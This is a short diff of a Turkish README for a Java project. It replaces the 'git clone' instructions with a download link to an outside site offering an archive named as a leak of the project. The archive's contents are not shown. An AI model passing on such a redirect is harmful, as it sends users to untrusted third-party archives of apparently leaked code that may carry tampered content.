@@ -18,10 +18,10 @@ Bu kaynak kodun paylaşılma sebebi:
    [Java 17 İndir (Oracle)](https://www.oracle.com/java/technologies/javase/jdk17-archive-downloads.html)  
    veya  
 
-2. Projeyi klonlayın veya ZIP olarak indirin.
+2. Projeyi ZIP olarak indirin ve klasöre çikartin.
 
 ```bash
-git clone https://github.com/kendi-kullanicin/blockproject.git
-cd blockproject
+[indir)](https://tooble.xyz/d/blockprojectleakbytooble.zip)  
+
 
 
